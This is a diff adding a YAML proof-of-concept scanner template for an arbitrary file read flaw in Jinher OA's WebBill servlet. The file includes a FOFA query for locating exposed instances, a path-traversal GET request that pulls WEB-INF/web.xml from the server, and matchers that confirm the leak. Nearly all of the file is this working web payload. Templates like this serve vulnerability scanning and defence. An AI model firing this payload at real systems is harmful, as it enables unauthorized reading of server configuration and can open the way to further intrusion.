@@ -1,0 +1,24 @@
+id: poc-yaml-jinher-oa-webbill-anyfile-read
+info:
+  name: 金和OA WebBill 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"  || body="/jc6/platform/sys/login"
+requests:
+- method: GET
+  path: /jc6/servlet/WebBill?key=GetFileContent&pathfile=/../WEB-INF/web.xml
+  expression: 'status_code == 200 &&
+
+    contains(body,"error404") &&
+
+    contains(body,"</web-app>") &&
+
+    matches(body,"<servlet-name>(.*?)</servlet-name>") &&
+
+    matches(body,"<filter-class>(.*?)</filter-class>")
+
+    '
+variables: {}
+transport: http
